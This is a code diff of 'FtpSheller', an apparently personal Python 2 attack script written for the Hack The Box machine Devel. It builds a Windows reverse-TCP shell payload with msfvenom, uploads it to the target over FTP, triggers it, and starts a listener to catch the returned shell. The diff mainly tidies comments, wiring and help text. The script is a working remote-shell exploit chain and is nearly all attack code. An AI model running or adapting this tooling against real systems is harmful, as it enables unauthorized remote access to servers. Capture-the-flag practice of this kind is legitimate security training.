@@ -20,12 +20,8 @@ try to upload a payload. It'll then trigger the payload and return the shell
 It's specifically made for the HTB box Devel from www.hackthebox.eu
 
 ####### TODO: ################
-   1. Include nc1 listener in this script and do multithreading
-   2. Automate msfvenom creation and add support for asp and php
-   3. Finish the tun0/eth0 subprocess thingy.. perhaps
-   4. Make ReadMe
-   5. Clean up this mess
-
+   1. Include nc listener in this script and do multithreading instead of calling it
+   2. Clean up this mess
 
 '''
 
@@ -52,10 +48,11 @@ class Attack(object):
             return False
 
     def payloadCreate(self):
-       print '[~] Creating payload'
-       with open(self.payload, 'wb') as out:
-           p = subprocess.Popen(["msfvenom", "-p", "windows/shell_reverse_tcp", "LHOST={}".format(self.lhost), "LPORT={}".format(self.lport), "-f", self.payloadType], stdout = out, stderr = subprocess.PIPE)
-           p.wait()
+        # TODO: Add support for php 
+        print '[~] Creating payload, hold on..'
+        with open(self.payload, 'wb') as out:
+            p = subprocess.Popen(["msfvenom", "-p", "windows/shell_reverse_tcp", "LHOST={}".format(self.lhost), "LPORT={}".format(self.lport), "-f", self.payloadType], stdout = out, stderr = subprocess.PIPE)
+            p.wait()
 
     def uploadPayload(self, rhost):
         try:
@@ -66,9 +63,9 @@ class Attack(object):
                     self.payloadCreate()
 		except Exception, e:
 		    print '[!] Error creating payload!'
-            else:
+            else: # TODO
                 try:
-                    subprocess.call(["msfvenom", ""]) # TODO
+                    self.payloadCreate()
 		except Exception, e:
 		    print '[!] Error creating payload!'
             ftp.storbinary('STOR {}'.format(self.payload), open(self.payload, 'rb'))
@@ -85,7 +82,7 @@ class Attack(object):
 	    import threading
 	    from subprocess import call
             def listener():
-                call(['python', 'nc1.py', '-l', str(self.lhost), self.lport])
+                call(['python', 'nc.py', '-l', str(self.lhost), self.lport])
 	    processThread = threading.Thread(target=listener)
 	    processThread.start()
 	    print '[+] Successfully started listener'
@@ -97,10 +94,10 @@ class Attack(object):
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(
-            description = 'FtpSheller')
+            description = 'FtpSheller. Will trigger and return payload for reverse TCP shell')
     parser.add_argument('--rhost', help = 'Remote host')
     parser.add_argument('--lhost', help = 'Local host listener')
     parser.add_argument('--lport', help = 'Local port listener')
-    parser.add_argument('--payloadType', help = 'Type of payload (asp, aspx, php')
+    parser.add_argument('--payloadType', help = 'Type of payload (asp, aspx')
     args = parser.parse_args()
     Attack(args)
